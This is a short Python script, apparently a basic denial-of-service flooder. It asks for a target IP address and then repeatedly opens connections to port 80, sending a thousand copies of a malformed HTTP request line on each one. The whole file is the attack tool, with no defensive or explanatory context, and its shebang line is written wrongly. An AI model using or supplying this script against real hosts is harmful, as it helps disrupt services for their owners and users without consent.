#!/usr/bin/env/python3
import socket

target = input("Enter target ip: ")

for i in range(1,100):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,80))
    data = b"GET / HTTP 1.1\r\n"*1000
    s.send(data)
    s.close()
